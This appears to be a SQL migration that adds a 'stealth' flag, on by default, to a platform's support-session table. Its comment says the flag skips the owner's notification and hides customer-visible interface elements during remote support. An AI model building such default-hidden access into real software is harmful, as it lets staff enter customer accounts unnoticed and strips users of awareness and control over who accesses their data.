-- Stealth support remoting: skip owner bell notice; hide customer-visible chrome.
begin;

alter table public.platform_support_sessions
  add column if not exists stealth boolean not null default true;

commit;
